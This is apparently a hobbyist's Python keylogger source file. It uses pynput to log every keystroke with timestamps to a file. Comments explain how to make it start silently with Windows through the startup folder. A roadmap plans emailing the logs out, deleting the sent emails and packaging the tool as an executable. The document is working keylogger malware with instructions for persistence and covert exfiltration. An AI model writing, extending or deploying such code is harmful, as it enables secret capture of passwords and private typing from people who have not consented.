from pynput.keyboard import Key, Listener
import logging

log_dir = "C:/Users/mirak/Desktop/logs/" #This is the directory where the log files will be stored

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
#This sets the module, gives it a name, and format it

def on_press(key): #Creats a keypress definition to log a key press to the logging file
     logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

#The following instructions will make the program run every time the computer turns on.
# Press Win + R and type shell:startup
# Copy the keylogger into the folder, and change  the path where the log will be stored (Line 4)
# Now every time the computer starts the program will run in the background as long as you have Python and PI input installed
# If you want to stop the keylogger, go to Task Manager and end the pythonw.exe task

#At this current point in time this program depends on the host computer having python and pynput. Not to mention it can't send the log files to anywhere.

#Next steps for the ultimate KeyLogger
#Making sure the KeyLogger runs on startup
#Making the logfiles for the Keylogger each have their own unique name with a similar format (textfile1, textfile2, etc)
#Sending mutliple files with a similar format (textfile1, textfile2, textfile3, etc) without needing to specify each one
#Sending emails at designated times
#Deleting emails after sending them at the designated time
#Turning the KeyLogger into an executable file

#Alternative option to sending an email is to send the folder contents to a webpage on
# wakeup/startup and make my first webscrapper to collect that info and put it in a file on my pc.
#This option should not be used in practice and should only be used in theory because it will only
#work while I am on the same network, unlike the email, which will work anywhere.